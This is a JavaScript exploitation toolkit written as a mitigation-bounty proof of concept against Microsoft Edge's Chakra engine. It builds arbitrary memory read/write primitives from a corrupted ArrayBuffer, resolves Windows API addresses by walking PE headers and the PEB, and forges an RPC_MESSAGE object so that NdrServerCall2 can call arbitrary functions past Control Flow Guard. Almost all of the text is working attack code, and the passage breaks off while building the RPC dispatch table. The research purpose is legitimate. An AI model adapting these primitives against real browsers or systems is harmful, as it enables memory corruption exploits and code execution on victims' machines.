/*
 * Mitigation bounty toolkit by @mxatone (Thomas Garnier)
 */
var initialized = false;
var logArea = null;
var spraycount = 1000;                  // How many array buffer to use
var sprayoffset = 900;                  // Offset to pick for reference
var arrspray = 0x20000 - 0x10;          // Size to spray with ArrayBuffer
var midspray = 100;						// Array buffers spread in the middle
var arraybuffer_ptr_off = 0x30;         // Where the ArrayBuffer ptr is
var arraybuffer_size_off = 0x38;        // Where the ArrayBuffer size is 
var debuglogs = false;                  // To debug each read/write

// Log messages, alert if no area defined
function log(msg) {
	if (logArea == null) {
		alert(msg);
		return;
	}
	if (logArea.value.length != 0)
		logArea.value += '\n';
	logArea.value += msg;
	logArea.scrollTop = logArea.scrollHeight;
}

// Separate each attempt
function logseperate() {
	if (logArea == null)
		return;
	if (logArea.value.length != 0)
		log('---------------------');
}

// Debug log, very slow
function debuglog(msg) {
	if (debuglogs == true) {
		log("DEBUG: "+msg);
	}
}

// Maximum char size of an integer held by AInt
var AIntSize = 16;

/*
 * Array integer constructor, allow to handle integers of any size.
 * Javascript does not like 64 bit unsigned integers.
 * It can represent only 53 bits. I could have used a public big int
 * library but none did what I wanted so I created this class.
 */
function AInt(v) {
	this.val = [];
	for (var i = 0; i < AIntSize; i++)
		this.val[i] = 0;
	if (v instanceof AInt) {
		for (var i = 0; i < AIntSize; i++) {
			this.val[i] = v.val[i];
		}
	} else if (v instanceof Uint8Array) {
		for (var i = 0, z = 0; i < v.byteLength; i++, z += 2) {
			this.val[z] = v[i] & 0xF;
			this.val[z + 1] = v[i] >> 4;
		}
	} else if (v instanceof Array) {
		for (var i = 0, z = 0; i < v.length; i++, z += 2) {
			var c = v[i];
			this.val[z] = c & 0xF;
			this.val[z + 1] = c >> 4;
		}
	} else {
		if (v < 0) {
			for (var i = 0; i < AIntSize; i++)
				this.val[i] = 0xF;
		}
		for (var i = 0; v !=0 && i < 8; i++, v >>= 4) {
			this.val[i] = v & 0xF;
		}
	}
	return this;
}

// Transform to AInt if needed
function toAInt(v) {
	if (!(v instanceof AInt))
		return new AInt(v);
	return v;
}

// Always get a javascript int
function getInt(off) {
	if (off instanceof AInt)
		off = off.toInt();
	return off;
}

// String representation with different base
AInt.prototype.Stringify = function(v = 10) {
	var ret = "";
	for(var i = this.val.length - 1; i >= 0; i--)
		ret += this.val[i].toString(v);
	ret = ret.replace(/^0+/,"");
	if (ret.length == 0)
		return "0";
	return ret;
}

// By default print both
AInt.prototype.toString = function() {
	var ret = this.Stringify(10);
	ret += " (";
	ret += this.Stringify(16);
	ret += ")";
	return ret;
}

// Addition for variable size integers
AInt.prototype.add = function(v) {
	var o = 0;
	var ret = new AInt(0);
	v = toAInt(v);
	for(var i = 0; i < AIntSize; i++) {
		ret.val[i] = this.val[i] + v.val[i] + o;
		if (ret.val[i] >= AIntSize) {
			o = 1;
			ret.val[i] -= AIntSize;
		} else {
			o = 0;
		}
	}
	return ret;
}

// Substraction for variable size integers
AInt.prototype.sub = function(v) {
	var b = 0;
	var ret = new AInt(0);
	v = toAInt(v);
	for(var i = 0; i < AIntSize; i++) {
		ret.val[i] = this.val[i] - v.val[i] - b;
		if (ret.val[i] < 0) {
			b = 1;
			ret.val[i] = AIntSize + ret.val[i];
		} else {
			b = 0;
		}
	}
	return ret;
}

// Align the current value
AInt.prototype.alignex = function(num) {
	var r = new AInt(this);
	for (var i = 0; i < num; i++)
		r.val[i] = 0;
	return r;
}

// Page align the current value
AInt.prototype.pagealign = function() {
	return this.alignex(3);
}

// Section align the current value
AInt.prototype.sectionalign = function() {
	return this.alignex(4);
}

// Check alignment
AInt.prototype.is_alignex = function(num) {
	for (var i = 0; i < num; i++)
		if (this.val[i] != 0)
			return false;
	return true;
}

// Check page align
AInt.prototype.is_pagealign = function() {
	return this.is_alignex(3);
}

// Check section align
AInt.prototype.is_sectionalign = function() {
	return this.is_alignex(4);
}

// Array int compare
AInt.prototype.equal = function(b) {
	b = toAInt(b);
	for (var i = 0; i < AIntSize; i++) {
		if (this.val[i] != b.val[i])
			return false;
	}
	return true;
}

function var_str_hex(a) {
	if (a instanceof AInt) {
		return a.Stringify(16);
	}
	return a.toString(16);
}

function throw_error(name, cmp, a, b) {
	var text = name + ": failed on ";
	text += var_str_hex(a) + " " + cmp + " " + var_str_hex(b);
	throw new Error(0, text);
}

// Shortcut to check if two values are equals
AInt.prototype.check_eq = function(b) {
	if (!this.equal(b)) {
		throw_error("check_eq", "=", this, b);
	}
}

// Shortcut to check if two values are not equals
AInt.prototype.check_ne = function(b) {
	if (this.equal(b)) {
		throw_error("check_ne", "!=", this, b);
	}
}

function check_args(a, b) {
	if (a == null)
			throw new Error(0, "check_args a is null");
	if (b == null)
			throw new Error(0, "check_args b is null");
}

// Shortcut to check if two integers are equals
function check_eq(a, b) {
	check_args(a, b);
	toAInt(a).check_eq(b);
}

// Shortcut to check if two integers are not equals
function check_ne(a, b) {
	check_args(a, b);
	toAInt(a).check_ne(b);
}

// Greater than
AInt.prototype.gt = function(b) {
	b = toAInt(b);
	if (this.equal(b))
		return false;
	var r = this.sub(b);
	if (r.val[AIntSize - 1] != (AIntSize - 1))
		return true;
	return false;
}

// Less than
AInt.prototype.lt = function(b) {
	b = toAInt(b);
	if (this.equal(b))
		return false;
	return !this.gt(b);
}

// Transform to int if possible
AInt.prototype.toInt = function() {
	var v = 0;
	for (var i = AIntSize - 1; i >= 0; i--) {
		v <<= 4;
		v |= this.val[i];
	}
	return v;
}

// Transform to array if possible
AInt.prototype.toArray = function() {
	var v = [];	
	for (var i = 0, z = 0; i < AIntSize; i += 2, z++) {
		v[z] = this.val[i] & 0xF;
		v[z] |= this.val[i + 1] << 4;
	}
	return v;
}

// Check the first QWORD is not zero
function was_correctly_changed(arr) {
	for (var i = 0; i < 8; i++) {
		if (arr[i] != 0)
			return true;
	}
	return false;
}

/*
 * Framework to read/write anywhere and more
 * The Read/Write primitive is created here
 */
function ExploitToolBox() {
	this.cache_flush();
	this.nextObject = 0;
	this.targetObject = null;
	this.view = null;
	this.proc_cache = new Array();
	this.abs_size = new AInt(0x7fffffff);
	this.abs_align = 7;
	this.abs_start_addr = null;
	this.abs_end_addr = null;
	this.abs_array = null;

	// Spray an array buffer
	var arr = new Array();
	for (i = 0; i < spraycount; i++)
		arr[i] = new ArrayBuffer(arrspray);
	this.buffer = arr[sprayoffset];
	
	/*
     * Overwrite ArrayBuffer to point to itself
	 * It allows me to have almost reliable RW conditions without an exploit
	 * I don't want to sit on an exploit for X months until my mitigation bounty PoC is ready!
	 */
	console.log(Object.isSealed(this.buffer));
	var tmp_view = new Uint8Array(this.buffer);
	if (!was_correctly_changed(tmp_view)) {
		log("Error: Hook didn't work, attach windbg to MicrosoftEdgeCP.exe and set this command:");
		log('bp chakra!Js::JavascriptObject::EntryIsSealed "r @r9; eq @r9+0x30 @r9; .echo Overwritten!; g"');
		log("Look at scripts/windbg_attach.ps1 <path to windbg.exe> to automate it");
		throw new Error(0, "ExploitToolBox creation failed");
	}
	
	// Setup auxiliary object to find other objects or create fake objects
	this.buffer.other = "NOTHING";
	
	// Read the current object
	this.view = tmp_view;
	this.vtable = this.readoffset_ptr(0);
	debuglog("vtable: "+ this.vtable.Stringify(16));
	this.basePtr = this.readoffset_ptr(arraybuffer_ptr_off);
	debuglog("chunk address: "+ this.basePtr.Stringify(16));
	
	// Look for an ArrayBuffer after to use
	for (var i = 8; i < 640; i += 8) {
		if (this.readoffset_ptr(i).equal(this.vtable) &&
			this.readoffset_uint(i + arraybuffer_size_off).equal(arrspray)) {
			this.nextObject = i;
			
			// Save the address of the ArrayBuffer data so we can use it
			// as a pool for allocations
			this.freeMemory = this.readoffset_ptr(i + arraybuffer_ptr_off);
			this.freeMemorySize = arrspray;
			
			// Change the length of one entry to identify which one we corrupted
			var marklen = 0xAAAA;
			this.writeoffset_uint(this.nextObject + arraybuffer_size_off, marklen);
			for (var z = 0; z < arr.length; z++) {
				if (arr[z].byteLength == marklen) {
					this.targetObject = arr[z];
					break;
				}
			}
			break;
		}
	}
	
	// Did not find an object next to me
	if (this.nextObject == 0) {
		log("Failed to find the next object offset, retry?");
		this.cleanup();
		throw new Error(0, "ExploitToolBox creation failed");
	}
	
	// Did not found the array entry
	if (this.targetObject == null) {
		log("The object we found was not one of ours?, retry?");
		this.cleanup();
		throw new Error(0, "ExploitToolBox creation failed");
	}
	
	// Check absolute address reading works
	var read_value = this.read_ptr(this.basePtr);
	if (!read_value.equal(this.vtable)) {
		log("Absolute read anywhere does not work? (" + this.vtable.Stringify(16) + " vs " + read_value.Stringify(16) + ")");
		this.cleanup();
		throw new Error(0, "ExploitToolBox creation failed");
	}
	
	return this;
}

// Reference a fake object using the auxiliary array
ExploitToolBox.prototype.call_fake_object = function(addr) {
	var aux = this.read_ptr(this.basePtr.add(0x10));
	this.write_ptr(aux, addr);
	
	// Do the call
	//return this.buffer.other[0];
	this.buffer.other();
}

// Get an address to free memory that was reserved by the ArrayBuffer corrupted
ExploitToolBox.prototype.allocate = function(size) {
	size = (size + 8) & ~7;
	if (this.freeMemorySize < size)
		throw new Error(0, "Not enough memory, asking " + size + " having " + this.freeMemorySize);
	this.freeMemorySize -= size;
	var ret = this.freeMemory;
	this.freeMemory = this.freeMemory.add(size);
	return ret;
}

// Take the PE header base on the base, return null if incorrect.
ExploitToolBox.prototype.find_module_pe_header = function(base) {
	// Take PE header offset
	var pe_off = this.read_uint(base.add(0x3C));
	// Bail if the offset is too big, we are looking at classic binaries
	if (pe_off.gt(0x600))
		return null;
	// PE OFF match
	var pe_header = base.add(pe_off);
	r = this.read_uint(pe_header);
	if (!r.equal(0x4550))
		return null;
	return pe_header;
}

// Search for the module base by backtracing section by section for the MZ header
ExploitToolBox.prototype.find_module_base = function(addr) {
	for (var it = addr.sectionalign(), t = 0;
		t < 40;
		it = it.sub(0x10000)) {
		// MZ match
		var r = this.read(it, 2);
		if (r[0] == 0x4d && r[1] == 0x5a && this.find_module_pe_header(it) != null)
			return it;
	}
	return null;
}

// Try to find a function in an export table
ExploitToolBox.prototype.SearchExportTable = function(target_module_base, function_name) {
	var target_module_header = this.find_module_pe_header(target_module_base);
	
	// Find the symbol in the export table
	var export_ptr = target_module_base.add(this.read_uint(target_module_header.add(0x88)));
	var export_size = this.read_uint(target_module_header.add(0x8C));
	
	var name_count = this.read_uint(export_ptr.add(0x18)).toInt();
	var name_table = target_module_base.add(this.read_uint(export_ptr.add(0x20)));
	var func_count = this.read_uint(export_ptr.add(0x14)).toInt();
	var func_table = target_module_base.add(this.read_uint(export_ptr.add(0x1C)));
	var ord_table = target_module_base.add(this.read_uint(export_ptr.add(0x24)));
	
	if (typeof function_name == "string") {
		function_name = function_name.toUpperCase();
		for (var i = 0; i < name_count; i++) {
			var name_ptr = target_module_base.add(this.read_uint(name_table));
			var cur_name = this.read_ascii(name_ptr);
			if (cur_name.toUpperCase() == function_name) {
				var ordinal = this.read_ushort(ord_table.add(i * 2)).toInt();
				if (ordinal >= func_count) {
					log("Name and function tables are not the same size?");
					break;
				}
				return target_module_base.add(this.read_uint(func_table.add(ordinal * 4)));
			}
			name_table = name_table.add(4);
		}
	} else { // number
		function_name--;
		if (function_name > 0 && function_name < func_count) {
			return target_module_base.add(this.read_uint(func_table.add(function_name * 4))); 
		}
	}
	return null;
}

// Take a read array and return a string
// Not how you are supposed to do it...
function unicode_str_transform(input) {
	var ret = "";
	for (var i = 0; i < input.length; i += 2) {
		if ((i + 1) >= input.length || input[i] == 0 || input[i + 1] != 0)
			break;
		ret += String.fromCharCode(input[i]);
	}
	return ret;
}

// Similar to kernel32.dll!GetProcAddress, use the PEB to find a function
ExploitToolBox.prototype.GetProcAddressFromPEB = function(module, function_name, throw_fail = true) {
	var peb = this.peb;
	var key = module + "!" + function_name.toString();
	var entry = this.proc_cache[key];
	if (entry != undefined)
		return entry;
	module = module.toUpperCase();
	var ldr = this.read_ptr(peb.add(0x18));
	var flink_head = this.read_ptr(ldr.add(0x10));
	for (var flink = this.read_ptr(flink_head);
		!flink.equal(flink_head);
		flink = this.read_ptr(flink)) {
		var base_unicode_length = this.read_ushort(flink.add(0x58));
		var base_unicode_ptr = this.read_ptr(flink.add(0x60));
		if (base_unicode_length.lt(module.length * 2))
			continue;
		var read_unicode_string = this.read(base_unicode_ptr, base_unicode_length.toInt());
		var ascii_string = unicode_str_transform(read_unicode_string);
		if (ascii_string.toUpperCase() == module) {
			var target_module_base = this.read_ptr(flink.add(0x30));
			var ret = this.SearchExportTable(target_module_base, function_name);
			this.proc_cache[key] = ret;
			if (ret == null) {
				var failure_text = "Failed to find function: " + function_name.toString();
				
				if (throw_fail)
					throw new Error(0, failure_text);
					
				log(failure_text);
			}
			return ret;
		}
	}
	
	var failure_text = "Failed to find module: " + module;
	
	if (throw_fail)
		throw new Error(0, failure_text);
		
	log(failure_text);
}

// Search for a module and function based on chakra.dll. Used only when we didn't find the PEB yet
ExploitToolBox.prototype.GetProcAddress = function(module, function_name) {
	var key = module + "!" + function_name;
	var entry = this.proc_cache[key];
	if (entry != undefined)
		return entry;

	// Find the base of the chakra.dll base on the vtable
	var chakra_base = this.find_module_base(this.vtable);
	if (chakra_base == null) {
		log("Could not found the base of chakra.dll, bailing");
		return null;
	}
	var chakra_pe_header = this.find_module_pe_header(chakra_base);
	
	var import_ptr = chakra_base.add(this.read_uint(chakra_pe_header.add(0x90)));
	var import_size = this.read_uint(chakra_pe_header.add(0x94));
	
	if (import_size.equal(0)) {
		log("Empty import section?");
		return null;
	}
	
	// Look at the imported libraries for the one we are looking for
	module = module.toUpperCase();
	var prev_name = null;
	var name = 0;
	for (var e = 0; e < 6000; import_ptr = import_ptr.add(0x14)) {
		var name = this.read_uint(import_ptr.add(0xC));
		if (name.equal(0)) {
			log("Module not found");
			return null;
		}

		// Already check that one
		if (prev_name != null && prev_name.equal(name))
			continue;
		var name_ptr = chakra_base.add(name);
		var cur_module = this.read_ascii(name_ptr);
		if (cur_module.toUpperCase() == module) {
			break;
		}
		debuglog("MODULE: " + cur_module);
		prev_name = name;
	}
	
	// Search the module base on the import table of the one we know
	var pointer_base_checked = [];
	var import_table = chakra_base.add(this.read_uint(import_ptr.add(0x10)));
	for (var offset = 0; offset < 10; offset++) {
		var pointerwithin = this.read_ptr(import_table.add(offset * 8));
		if (pointerwithin.equal(0))
			break;
		
		// Get a pointer to the module and search for the base
		var target_module_base = this.find_module_base(pointerwithin);
		if (target_module_base == null) {
			continue;
		}
		var already_done = false;
		for (var i = 0; i < pointer_base_checked.length; i++) {
			if (pointer_base_checked[i].equal(target_module_base)) {
				already_done = true;
				break;
			}
		}
		if (already_done)
			continue;
		pointer_base_checked.push(target_module_base);
		var r = this.SearchExportTable(target_module_base, function_name);
		if (r != null) {
			this.proc_cache[key] = r;
			return r;
		}
	}
	
	log("Failed to find " + module + "!" + function_name);
	return null
}

// Clean-up so we can retry, reduce changes of crashes from the changes we did.
ExploitToolBox.prototype.cleanup = function(off, arr) {
	if (this.view != null) {
		this.memsetoffset(arraybuffer_ptr_off, 8);
		if (this.nextObject != 0) {
			this.memsetoffset(this.nextObject + arraybuffer_ptr_off, 8);
			this.memsetoffset(this.nextObject + arraybuffer_size_off, 4);
		}	
		this.view = null;
	}
}

// Write an offset as arrInt
ExploitToolBox.prototype.writeoffset = function(off, arr) {
	var x = getInt(off); 
	debuglog("writeoffset(0x" + x.toString(16) + ") = " + arr);
	debuglog(this.view);
	for (var i = 0, z = 0; i < arr.length; i++)
		this.view[x + i] = arr[i];
}

// Memset at specific offset for cleanup
ExploitToolBox.prototype.memsetoffset = function(off, size) {
	var arr = new Array();
	for (var i = 0; i < size; i++)
		arr[i] = 0;
	this.writeoffset(off, arr);
}

// Write a uint at a specific offset
ExploitToolBox.prototype.writeoffset_uint = function(off, v) {
	var off = getInt(off);
	v = toAInt(v);
	this.writeoffset(off, v.toArray().slice(0, 4));
	debuglog("writeoffset_uint(0x" + off.toString(16) + ") = 0x" + v.Stringify(16));
}

// Write a ptr at a specific offset
ExploitToolBox.prototype.writeoffset_ptr = function(off, v) {
	var x = getInt(off);
	v = toAInt(v);
	this.writeoffset(x, v.toArray().slice(0, 8));
	debuglog("writeoffset_uint(0x" + x.toString(16) + ") = 0x" + v.Stringify(16));
}

// Read an offset as arrInt
ExploitToolBox.prototype.readoffset = function(off, size) {
	var x = getInt(off); 
	var val = new AInt();
	for (var i = 0, z = 0; i < size; i++) {
		val.val[z++] = this.view[x + i] & 0xF;
		val.val[z++] = this.view[x + i] >> 4;
	}
	return val;
}

// Read a ptr at a specific offset
ExploitToolBox.prototype.readoffset_ptr = function(off) {
	var x = getInt(off); 
	var val = this.readoffset(x, 8);
	debuglog("readoffset_ptr(0x" + x.toString(16) + ") = 0x" + val.Stringify(16));
	return val;
}

// Read a uint at a specific offset
ExploitToolBox.prototype.readoffset_uint = function(off) {
	var x = getInt(off); 
	var val = this.readoffset(x, 4);
	debuglog("readoffset_uint(0x" + x.toString(16) + ") = 0x" + val.Stringify(16));
	return val;
}

// Flush the read cache
ExploitToolBox.prototype.cache_flush = function() {
	this.cache = new Array();
}

// Update the window in absolute memory
ExploitToolBox.prototype.abs_update_window = function(addr, size) {
	var end = addr.add(size);
	
	if (this.abs_array != null) {
		// Current window is already good
		if (!this.abs_start_addr.gt(addr) && this.abs_end_addr.gt(end)) 
			return;
	}
	
	this.abs_start_addr = addr.alignex(this.abs_align);
	this.abs_end_addr = this.abs_start_addr.add(this.abs_size);
	
	// Spawn two window, not supposed to be possible with the large size
	if (end.gt(this.abs_end_addr))
	 throw new Error(0, "error on abs_update_window (" + addr.Stringify(16) + " -> " + end.Stringify(16) + ")");
	 
	this.writeoffset_ptr(this.nextObject + arraybuffer_ptr_off, this.abs_start_addr);
	this.writeoffset_uint(this.nextObject + arraybuffer_size_off, this.abs_size);
	this.abs_array = new Uint8Array(this.targetObject);
}

// Get slice of current window
ExploitToolBox.prototype.abs_get_slice = function(addr, size) {
	size = getInt(size);
	this.abs_update_window(addr, size);
	var index = addr.sub(this.abs_start_addr).toInt();
	return this.abs_array.slice(index, index + size);
}

// Set slice of current window
ExploitToolBox.prototype.abs_set_slice = function(addr, data, size) {
	size = getInt(size);
	this.abs_update_window(addr, size);
	var index = addr.sub(this.abs_start_addr).toInt();
	if (data.length > size)
		data = data.slice(0, size);
	this.abs_array.set(data, index);
}

// Find or fetch the page in the cache to make it faster
ExploitToolBox.prototype.get_cache_page = function(addr) {
	var key = addr.Stringify(16);
	var entry = this.cache[key];
	if (entry != undefined && entry != null)
		return entry;

	var buf = Array.from(this.abs_get_slice(addr, 0x1000));
	this.cache[key] = buf;
	return buf;
}	

// Read an absolute address
ExploitToolBox.prototype.read = function(addr, size) {
	addr = toAInt(addr);
	if (addr.lt(0x100000))
		throw new Error(0, "Low address, retry? " + addr.Stringify(16));
	var ret = new Array();
	var i = 0;
	while (i < size) {
		var cur_addr = addr.add(i);
		var cur_page = cur_addr.pagealign();
		var p = this.get_cache_page(cur_page);
		var off = cur_addr.sub(cur_page).toInt();
		var copy = Math.min(size - i, 0x1000 - off);
		ret = ret.concat(p.slice(off, off + copy));
		i += copy;
	}
	debuglog("read(0x" + addr.Stringify(16) + ") = " + ret);
	return ret;
}

// Read an absolute address to a pointer
ExploitToolBox.prototype.read_ptr = function(addr) {
	return new AInt(this.read(addr, 8));
}

// Read an absolute address to a uint
ExploitToolBox.prototype.read_uint = function(addr) {
	return new AInt(this.read(addr, 4));
}

// Read an absolute address to a ushort
ExploitToolBox.prototype.read_ushort = function(addr) {
	return new AInt(this.read(addr, 2));
}

// Read ASCII string
ExploitToolBox.prototype.read_ascii = function(addr) {
	var ret = "";
	for (var i = 0; i < 256; i++) {
		var cur = this.read(addr.add(i), 1)[0];
		if (cur == 0)
			break;
		ret += String.fromCharCode(cur);
	}
	return ret;
}

// Write an absolute address
ExploitToolBox.prototype.write = function(addr, data, size) {
	if (addr.lt(0x100000))
		throw new Error(0, "Low address, retry? " + addr.Stringify(16));
	if (typeof data == 'number')
		data = new AInt(data);
	if (!(data instanceof Array))
		data = data.toArray();
	this.abs_set_slice(addr, data, size);
}

// Write an absolute address to a pointer
ExploitToolBox.prototype.write_ptr = function(addr, data) {
	this.write(addr, data, 8);
}

// Write an absolute address to a uint
ExploitToolBox.prototype.write_uint = function(addr, data) {
	this.write(addr, data, 4);
}

// Write an absolute address to a ushort
ExploitToolBox.prototype.write_ushort = function(addr, data) {
	this.write(addr, data, 2);
}

// Write a string
ExploitToolBox.prototype.write_string = function(addr, data) {
	var arr = new Array();
	for (var i = 0; i < data.length; i++) {
		arr[i] = data.charCodeAt(i);
	}
	
	arr[data.length] = 0;
	this.write(addr, arr, arr.length);
}

// Write a wchar string
ExploitToolBox.prototype.write_wstring = function(addr, data) {
	var z = 0;
	var arr = new Array();
	for (var i = 0; i < data.length; i++) {
		arr[z++] = data.charCodeAt(i);
		arr[z++] = 0;
	}
	
	arr[z++] = 0;
	arr[z++] = 0;
	this.write(addr, arr, arr.length);
}

function pattern_equal(arr, offset, data) {
	for (var z = 0; z < data.length; z++) {
		if (data[z] != arr[offset + z])
			return false;
	}
	return true;
}

// Search slowly for a pattern, could be made much faster but the cache should help.
ExploitToolBox.prototype.find_pattern_in_scope = function(base, size, data) {
	if (data instanceof AInt)
		data = data.toArray();
	var fetched = this.read(base, size);
	for (var i = 0; i < (size - data.length); i++) {
		if (pattern_equal(fetched, i, data))
			return base.add(i);
	}
	return null;
}

// Find the module image size
ExploitToolBox.prototype.find_image_size = function(addr) {
	var module_nt_header = this.find_module_pe_header(addr);
	return this.read_uint(module_nt_header.add(0x50)).toInt();
}

// Find pattern in a module
ExploitToolBox.prototype.find_pattern_in_module = function(addr, data) {
	var modulebase = this.find_module_base(addr);
	var image_size = this.find_image_size(modulebase);
	return this.find_pattern_in_scope(modulebase, image_size, data);
}

// Find pattern in a module but from address
ExploitToolBox.prototype.find_pattern_in_module_from = function(addr, data) {
	var modulebase = this.find_module_base(addr);
	var image_size = this.find_image_size(modulebase);
	return this.find_pattern_in_scope(addr, modulebase.add(image_size).sub(addr).toInt(), data);
}

// Duplicate string in memory
ExploitToolBox.prototype.dup_string = function(target_str) {
	var target_alloc = this.allocate(target_str.length + 1);
	this.write_string(target_alloc, target_str);
	return target_alloc;
}

// Duplicate wstring in memory
ExploitToolBox.prototype.dup_wstring = function(target_str) {
	var target_alloc = this.allocate((target_str.length + 1) * 2);
	this.write_wstring(target_alloc, target_str);
	return target_alloc;
}

// GUID to array
ExploitToolBox.prototype.GUID_to_array = function(data1, data2, data3, data4) {
	data1 = (new AInt(data1)).toArray().slice(0, 4);
	data2 = (new AInt(data2)).toArray().slice(0, 2);
	data3 = (new AInt(data3)).toArray().slice(0, 2);
	data4 = (new AInt(data4)).toArray();
	return data1.concat(data2).concat(data3).concat(data4);
}

// Dup a javascript array to reserved memory
ExploitToolBox.prototype.dup_array = function(arr) {
	var data = this.allocate(arr.length);
	this.write(data, arr, arr.length);
	return data;
}

// Dup a GUID to memory
ExploitToolBox.prototype.dup_GUID = function(data1, data2, data3, data4) {
	return this.dup_array(this.GUID_to_array(data1, data2, data3, data4));
}

/*
 * This section uses an RPC_MESSAGE to call any valid CFG function with full
 * control of all the arguments. We get the return value as well.
 */

/*
 * RPC NDR Format string for 12 unsigned 64 bit integer arguments
 * and an unsigned 64 bit return value
 */
var rpc_arg_count = 12;
var rpc_proc_format_string = [
	0x32, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x68, 0x00, 0xc0, 0x00, 0x10, 0x00, 0x44, 0x0d,
	0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x0b, 0x00,
	0x48, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x48, 0x00,
	0x10, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x18, 0x00,
	0x0b, 0x00, 0x48, 0x00, 0x20, 0x00, 0x0b, 0x00,
	0x48, 0x00, 0x28, 0x00, 0x0b, 0x00, 0x48, 0x00,
	0x30, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x38, 0x00,
	0x0b, 0x00, 0x48, 0x00, 0x40, 0x00, 0x0b, 0x00,
	0x48, 0x00, 0x48, 0x00, 0x0b, 0x00, 0x48, 0x00,
	0x50, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x58, 0x00,
	0x0b, 0x00, 0x70, 0x00, 0x60, 0x00, 0x0b, 0x00,
	0x00 ];

// Used to find the vftable. Not pretty but works.
var osf_scall_function_pattern = [
	0x48, 0x83, 0xEC, 0x28, 0xB9, 0xE4, 0x06, 0x00, 0x00
];

/*
 * Search for const OSF_SCALL::`vftable'
 * It assumes it is the first match, might need to be updated in future versions.
 */
function get_osf_scall_vtable(exp) {
	var sr = exp.GetProcAddress("rpcrt4.dll", "NdrSendReceive");
	if (sr == null) {
		log("Can't find NdrSendReceive");
		return null;
	}
	
	var modulebase = exp.find_module_base(sr);
	var pattern1 = exp.find_pattern_in_module(modulebase, osf_scall_function_pattern);
	if (pattern1 == null) {
		log("pattern1 not found");
		return null;
	}
	var within_vtable = exp.find_pattern_in_module(modulebase, pattern1);
	if (within_vtable == null) {
		// RFG add 9 bytes before
		within_vtable = exp.find_pattern_in_module(modulebase, pattern1.sub(9));
		if (within_vtable == null) {
			log("pattern2 not found (pattern 1 was " + pattern1.Stringify(16) + ") with or without rfg");
			return null;
		}
	}
	return within_vtable.sub(0xe8); // Function position in the vtable
}

// Create a fake object to use to for argument to NdrServerCall2
function create_fake_object(exp) {
	// Needed for the stubs
	var malloc = exp.GetProcAddress("msvcrt.dll", "malloc");
	if (malloc == null) {
		log("Can't find malloc");
		return null;
	}
	var free = exp.GetProcAddress("msvcrt.dll", "free");
	if (free == null) {
		log("Can't find free");
		return null;
	}
	// Search for the NdrServerCall handler
	var ndrservercall = exp.GetProcAddress("rpcrt4.dll", "NdrServerCall2");
	if (free == null) {
		log("Can't find free");
		return null;
	}

	var type_obj = exp.allocate(0x10000);
	var addr = exp.allocate(0x200);
	var vtable = exp.allocate(0x1000);
	var zero_mem = exp.allocate(0x200);
	
	// Align to 0x0010 to be similar to the DataReprenstation flag
	// While being a pointer for the Javascript type
	while (!type_obj.is_sectionalign())
		type_obj = type_obj.add(1);
		
	type_obj = type_obj.add(0x10);

	// Everything required for Javascript to use the object
	exp.write_ptr(addr, vtable);                          // Should be a vtable, not really used in this case
	exp.write_ptr(addr.add(8), type_obj);
	exp.write_uint(type_obj, 0x40);                       // JsrtExternalType
	exp.write_ptr(type_obj.add(0x28), zero_mem);
	var step_page = exp.allocate(0x1000);
	exp.write_ptr(type_obj.add(8), step_page);
	exp.write_ptr(type_obj.add(0x18), ndrservercall);     // Javascript CallFunction<1> use this entry
	for (var i = 0x400; i < 0x500; i += 8) // Make it large, different Windows 10 versions use different versions
		exp.write_ptr(step_page.add(i), step_page);
	exp.write_ptr(step_page.add(0x550), zero_mem);
	
	// Then everything needed to have it as an RPC_MESSAGE
	// Specific handlers for RPC
	var osf = get_osf_scall_vtable(exp);
	if (osf == null) {
		log("get_osf_scall_vtable failed");
		return null;
	}
	exp.write_ptr(vtable, osf);
	
	// Raise exception on return without that.
	exp.write_uint(vtable.add(0x8), 0x89ABCDEF);
	exp.write_uint(vtable.add(0xC), 0x40);
	exp.write_uint(vtable.add(0x1C8), 0x80);
	exp.write_ptr(vtable.add(0x110), zero_mem);
	exp.write_ptr(vtable.add(0x118), zero_mem);
	
	exp.write_uint(addr.add(0x48), 0x1000);       // RpcFlags
	
	// RPC_SYNTAX_IDENTIFIER
	var rpc_syntax = exp.allocate(0x20);
	exp.write_ptr(addr.add(0x20), rpc_syntax);    // ->TransferSyntax
	exp.write_ushort(rpc_syntax.add(0x10), 2);    // RPC version 2.0
	
	// RPC_SERVER_INTERFACE
	var rpc_interface = exp.allocate(0x70);
	exp.write_ptr(addr.add(0x28), rpc_interface);       // ->RpcInterfaceInformation
	exp.write_uint(rpc_interface.add(0x10), 0x60);       // Length
	exp.write_ushort(rpc_interface.add(0x14), 1);       // RPC version 1.0
	exp.write_ushort(rpc_interface.add(0x28), 2);       // RPC version 2.0
	exp.write_uint(rpc_interface.add(0x58), 0x4000000); // Flags
	
	// > MIDL_SERVER_INFO
	var midl_server_info = exp.allocate(0x40);
	exp.write_ptr(rpc_interface.add(0x50), midl_server_info); // ->InterpreterInfo
	var fmt_string_offset = exp.allocate(rpc_proc_format_string.length);
	exp.write(fmt_string_offset, rpc_proc_format_string, rpc_proc_format_string.length); // Copy whole format
	exp.write_ptr(midl_server_info.add(0x10), fmt_string_offset);  // ProcString "2H" ...
	exp.write_ptr(midl_server_info.add(0x18), zero_mem);     // ProcString "2H" ...
	
	 // > > MIDL_STUB_DESC
	var midl_stub_dec = exp.allocate(0x98);
	exp.write_ptr(midl_server_info.add(0), midl_stub_dec);   // ->pStubDesc
	exp.write_ptr(midl_stub_dec.add(0), rpc_interface);      // RpcInterfaceInformation
	exp.write_ptr(midl_stub_dec.add(0x8), malloc);           // pfnAllocate
	exp.write_ptr(midl_stub_dec.add(0x10), malloc);          // pfnFree
	exp.write_ptr(midl_stub_dec.add(0x40), zero_mem);        // pFormatTypes
	exp.write_uint(midl_stub_dec.add(0x48), 1);              // fCheckBounds
	exp.write_uint(midl_stub_dec.add(0x4C), 0x50002);        // Version
	exp.write_ptr(midl_stub_dec.add(0x58), 134218331);       // MIDLVersion
	exp.write_ptr(midl_stub_dec.add(0x78), 1);               // mFlags
	
	// Function table
	var function_table = exp.allocate(0x20);
	exp.write_ptr(midl_server_info.add(8), function_table);   // ->->DispatchTable
	
	// > RPC_DISPATCH_TABLE
